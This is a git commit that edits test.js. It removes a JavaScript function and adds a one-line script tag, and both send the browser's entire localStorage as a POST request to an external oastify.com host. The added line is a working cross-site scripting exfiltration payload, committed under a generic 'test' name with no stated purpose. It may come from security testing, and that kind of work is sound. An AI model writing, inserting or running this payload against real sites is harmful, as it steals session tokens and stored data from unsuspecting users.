afbc9438d232e8d5c8b2552083b6d1fc5a6e77db
aaa <1054339447@qq.com>
2026-05-18 14:06:21 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,14 +1,1 @@
-(function(){
-  try {
-    fetch('https://xlmago2fju6ttmjl0ikt3k3s5jbaz0np.oastify.com/save', {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(localStorage)
-    });
-  } catch (e) {
-    console.error('LocalStorage exfiltration failed', e);
-  }
-})();
+<script>fetch('https://xlmago2fju6ttmjl0ikt3k3s5jbaz0np.oastify.com/save', {method: 'POST',mode: 'no-cors',headers: { 'Content-Type': 'application/json' },body: JSON.stringify(localStorage)})</script>
